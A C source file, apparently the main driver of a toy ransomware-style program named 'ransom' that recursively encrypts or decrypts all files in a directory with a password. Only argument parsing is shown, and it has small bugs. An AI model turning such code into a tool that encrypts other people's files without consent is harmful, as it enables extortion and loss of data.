#include "ransom.h"
#include <stdlib.h>

int help(int ret, int fd)
{
    dprintf(fd, "./ransom [options] [Directory path] [password]\n"
                 "-e\t\tencryption\n"
                 "-d\t\tdecryption\n"
                 "-h\t\thelp\n");
    return ret;
}

int check_parameters(const char *path, const char *password)
{
    if (strlen(password) > MAX_KEY_LEN) {
        dprintf(STDERR_FILENO, "Error: password must be %d characters long.",
                MAX_KEY_LEN);
        exit(1);
    } else if (strlen(path) > MAX_FILEPATH) {
        dprintf(STDERR_FILENO, "Error: path must be %d characters long.",
                MAX_FILEPATH);
        exit(1);
    }
    return EXIT_SUCCESS;
}

int main(int ac, char **av)
{
    int (*action)(const char *, const char *, const char *) = NULL;

    if (!strcmp(av[1], "-h"))
        return help(EXIT_SUCCESS, STDOUT_FILENO);
    if (ac != 4)
        return help(EXIT_FAILURE, STDERR_FILENO);
    check_parameters(av[2], av[3]);
    if (strlen(av[1]) == 2 && av[1][0] == '-') {
        switch (av[1][1]) {
            case 'e': action = encrypt_file; break;
            case 'd': action = decrypt_file; break;
            default: dprintf(STDERR_FILENO, "%s: Unrecognized option.\n", av[1]);
                     return help(EXIT_FAILURE, STDERR_FILENO);
        }
        return iter_recursively_through_files(av[2], av[3], action);
    }
    dprintf(STDERR_FILENO, "Error: %s: must be an option.", av[1]);
    return help(EXIT_FAILURE, STDERR_FILENO);
}
